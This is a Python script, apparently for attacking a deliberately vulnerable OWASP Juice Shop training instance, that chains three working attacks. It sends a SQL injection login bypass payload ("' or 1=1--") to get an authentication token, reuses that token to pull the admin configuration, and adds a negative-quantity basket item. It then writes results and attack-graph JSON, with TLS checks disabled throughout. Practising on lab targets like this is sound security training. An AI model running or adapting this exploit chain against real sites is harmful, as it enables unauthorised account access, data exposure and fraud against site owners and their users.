   import argparse                                                                                       
   import requests                                                                                       
   import json                                                                                           
   import os                                                                                             
   import time                                                                                           
   from datetime import datetime                                                                         
   import urllib3                                                                                        
                                                                                                         
   # Disable SSL warnings                                                                                
   urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)                                   
                                                                                                         
   # Attack module for SQL injection login bypass                                                        
   def execute_sqli_login(target):                                                                       
       """Exploit SQL injection vulnerability in Juice Shop login"""                                     
       print("\n[+] Starting SQL injection attack on login endpoint...")                                 
       payload = {                                                                                       
           "email": "' or 1=1--",                                                                        
           "password": "anything"                                                                        
       }                                                                                                 
                                                                                                         
       try:                                                                                              
           response = requests.post(                                                                     
               f"{target}/rest/user/login",                                                              
               json=payload,                                                                             
               verify=False,                                                                             
               timeout=20                                                                                
           )                                                                                             
                                                                                                         
           if response.status_code == 200:                                                               
               data = response.json()                                                                    
               token = data.get('authentication', {}).get('token', 'Not found')                          
               user = data.get('user', {}).get('email', 'Unknown')                                       
               print(f"[+] Authentication bypass successful! Token: {token[:20]}...")                    
               return {                                                                                  
                   "success": True,                                                                      
                   "module": "sqli_login",                                                               
                   "evidence": {"token_found": token is not None and "ey" in token},                     
                   "details": data,                                                                      
                   "new_state": {                                                                        
                       "access_token": token,                                                            
                       "user": user,                                                                     
                       "elevated": "admin" in data if user else False                                    
                   }                                                                                     
               }                                                                                         
           else:                                                                                         
               print(f"[-] Attack failed with status: {response.status_code}")                           
               return {                                                                                  
                   "success": False,                                                                     
                   "status": response.status_code,                                                       
                   "response": response.text[:200] + "..."                                               
               }                                                                                         
                                                                                                         
       except Exception as e:                                                                            
           print(f"[-] Critical error: {str(e)}")                                                        
           return {                                                                                      
               "success": False,                                                                         
               "error": str(e)                                                                           
           }                                                                                             
                                                                                                         
   # Attack module for configuration access                                                              
   def execute_config_access(target, token):                                                             
       """Access admin configurations using obtained token"""                                            
       print("\n[+] Attempting admin configuration access...")                                           
       try:                                                                                              
           response = requests.get(                                                                      
               f"{target}/rest/admin/application-configuration",                                         
               headers={"Authorization": f"Bearer {token}"},                                             
               verify=False,                                                                             
               timeout=20                                                                                
           )                                                                                             
                                                                                                         
           if response.status_code == 200:                                                               
               print("[+] Successfully accessed admin configuration")                                    
               return {                                                                                  
                   "success": True,                                                                      
                   "module": "config_access",                                                            
                   "evidence": {"config_size": len(response.text)},                                      
                   "details": {"config_keys": list(response.json().keys())[:5]},                         
                   "new_state": {"config_accessed": True}                                                
               }                                                                                         
           else:                                                                                         
               print(f"[-] Access failed: {response.status_code}")                                       
               return {"success": False, "status": response.status_code}                                 
                                                                                                         
       except Exception as e:                                                                            
           print(f"[-] Error in config access: {str(e)}")                                                
           return {"success": False, "error": str(e)}                                                    
                                                                                                         
   # Attack module for basket tampering                                                                  
   def execute_basket_tamper(target, token):                                                             
       """Manipulate basket contents"""                                                                  
       print("\n[+] Attempting basket manipulation...")                                                  
       try:                                                                                              
           # Step 1: Get user basket ID                                                                  
           response = requests.get(                                                                      
               f"{target}/api/BasketItems",                                                              
               headers={"Authorization": f"Bearer {token}"},                                             
               verify=False,                                                                             
               timeout=15                                                                                
           )                                                                                             
                                                                                                         
           if response.status_code != 200:                                                               
               return {"success": False, "step": "basket_id_fetch", "status": response.status_code}      
                                                                                                         
           basket_id = response.json()['data'][0]['BasketId']                                            
                                                                                                         
           # Step 2: Add negative quantity item                                                          
           payload = {                                                                                   
               "ProductId": 1,                                                                           
               "quantity": -1                                                                            
           }                                                                                             
                                                                                                         
           response = requests.post(                                                                     
               f"{target}/api/BasketItems",                                                              
               headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},         
               json=payload,                                                                             
               verify=False,                                                                             
               timeout=15                                                                                
           )                                                                                             
                                                                                                         
           if response.status_code < 400:                                                                
               print("[+] Basket tampering successful!")                                                 
               return {                                                                                  
                   "success": True,                                                                      
                   "module": "basket_tamper",                                                            
                   "new_state": {"basket_modified": True},                                               
                   "details": response.json()                                                            
               }                                                                                         
           else:                                                                                         
               print(f"[-] Basket tampering failed: {response.status_code}")                             
               return {"success": False, "status": response.status_code}                                 
                                                                                                         
       except Exception as e:                                                                            
           print(f"[-] Basket error: {str(e)}")                                                          
           return {"success": False, "error": str(e)}                                                    
                                                                                                         
   # Main attack sequence                                                                                
   def execute_attack_sequence(target_url):                                                              
       """Execute full attack sequence"""                                                                
       start_time = datetime.now()                                                                       
                                                                                                         
       # Store all results                                                                               
       attack_results = {                                                                                
           "target": target_url,                                                                         
           "start_time": start_time.isoformat(),                                                         
           "steps": []                                                                                   
       }                                                                                                 
                                                                                                         
       # Step 1: SQL Injection login                                                                     
       login_results = execute_sqli_login(target_url)                                                    
       attack_results["steps"].append({                                                                  
           "step": "SQL Injection Login Bypass",                                                         
           "time": datetime.now().isoformat(),                                                           
           "results": login_results                                                                      
       })                                                                                                
                                                                                                         
       # Step 2: Config access (if login successful)                                                     
       if login_results.get("success"):                                                                  
           token = login_results["new_state"]["access_token"]                                            
           config_results = execute_config_access(target_url, token)                                     
           attack_results["steps"].append({                                                              
               "step": "Admin Configuration Access",                                                     
               "time": datetime.now().isoformat(),                                                       
               "results": config_results                                                                 
           })                                                                                            
                                                                                                         
           # Step 3: Basket tampering                                                                    
           if token:                                                                                     
               basket_results = execute_basket_tamper(target_url, token)                                 
               attack_results["steps"].append({                                                          
                   "step": "Basket Manipulation",                                                        
                   "time": datetime.now().isoformat(),                                                   
                   "results": basket_results                                                             
               })                                                                                        
                                                                                                         
       attack_results["end_time"] = datetime.now().isoformat()                                           
                                                                                                         
       # Success determination                                                                           
       attack_results["success"] = any(step["results"].get("success") for step in                        
 attack_results["steps"])                                                                                
                                                                                                         
       return attack_results                                                                             
                                                                                                         
   def generate_attack_graph(results):                                                                   
       """Generate data for visualization"""                                                             
       nodes = []                                                                                        
       edges = []                                                                                        
                                                                                                         
       # Define nodes                                                                                    
       nodes.append({                                                                                    
           "id": "r1",                                                                                   
           "type": "recon",                                                                              
           "description": "Target Identification"                                                        
       })                                                                                                
                                                                                                         
       if results["steps"]:                                                                              
           if results["steps"][0]["results"]["success"]:                                                 
               nodes.extend([                                                                            
                   {                                                                                     
                       "id": "v1",                                                                       
                       "type": "vulnerability",                                                          
                       "description": "SQL Injection in Login",                                          
                       "results": results["steps"][0]["results"]                                         
                   },                                                                                    
                   {                                                                                     
                       "id": "e1",                                                                       
                       "type": "exploit",                                                                
                       "description": "Authentication Bypass",                                           
                       "results": results["steps"][0]["results"]                                         
                   }                                                                                     
               ])                                                                                        
               edges = [                                                                                 
                   {"from": "r1", "to": "v1"},                                                           
                   {"from": "v1", "to": "e1"}                                                            
               ]                                                                                         
                                                                                                         
           if len(results["steps"]) > 1 and results["steps"][1]["results"]["success"]:                   
               nodes.extend([                                                                            
                   {                                                                                     
                       "id": "v2",                                                                       
                       "type": "vulnerability",                                                          
                       "description": "Improper Access Control",                                         
                       "results": results["steps"][1]["results"]                                         
                   },                                                                                    
                   {                                                                                     
                       "id": "e2",                                                                       
                       "type": "exploit",                                                                
                       "description": "Admin Configuration Access",                                      
                       "results": results["steps"][1]["results"]                                         
                   }                                                                                     
               ])                                                                                        
               edges.extend([                                                                            
                   {"from": "e1", "to": "v2"},                                                           
                   {"from": "v2", "to": "e2"}                                                            
               ])                                                                                        
                                                                                                         
           if len(results["steps"]) > 2 and results["steps"][2]["results"]["success"]:                   
               nodes.append({                                                                            
                   "id": "v3",                                                                           
                   "type": "vulnerability",                                                              
                   "description": "Business Logic Flaw",                                                 
                   "results": results["steps"][2]["results"]                                             
               })                                                                                        
               nodes.append({                                                                            
                   "id": "e3",                                                                           
                   "type": "exploit",                                                                    
                   "description": "Negative Quantity Purchase",                                          
                   "results": results["steps"][2]["results"]                                             
               })                                                                                        
               edges.extend([                                                                            
                   {"from": "e1", "to": "v3"},                                                           
                   {"from": "v3", "to": "e3"}                                                            
               ])                                                                                        
                                                                                                         
       # Add node IDs to edges                                                                           
       for edge in edges:                                                                                
           edge["source"] = edge["from"]                                                                 
           edge["target"] = edge.pop("to")                                                               
                                                                                                         
       return {"nodes": nodes, "edges": edges}                                                           
                                                                                                         
   def main():                                                                                           
       parser = argparse.ArgumentParser(description="Juice Shop Attacker")                               
       parser.add_argument("target", help="URL of Juice Shop instance")                                  
       parser.add_argument("-o", "--output", default="attack_results.json", help="Output file path")     
       args = parser.parse_args()                                                                        
                                                                                                         
       print(f"\nStarting attack against {args.target}")                                                 
       print("="*50)                                                                                     
                                                                                                         
       # Run attack sequence                                                                             
       attack_results = execute_attack_sequence(args.target.rstrip('/'))                                 
                                                                                                         
       # Save attack results                                                                             
       with open(args.output, "w") as f:                                                                 
           json.dump(attack_results, f, indent=2)                                                        
       print(f"\nAttack results saved to {args.output}")                                                 
                                                                                                         
       # Generate graph data                                                                             
       graph_data = generate_attack_graph(attack_results)                                                
       with open("attack_graph.json", "w") as f:                                                         
           json.dump(graph_data, f, indent=2)                                                            
       print("Attack graph data saved to attack_graph.json")                                             
                                                                                                         
       # Generate summary                                                                                
       print("\nAttack Summary:")                                                                        
       print("="*50)                                                                                     
       for i, step in enumerate(attack_results["steps"]):                                                
           status = "✅ SUCCESS" if step["results"].get("success") else "❌ FAILED"                      
           print(f"{i+1}. {step['step']} - {status}")                                                    
                                                                                                         
   if __name__ == "__main__":                                                                            
       main()
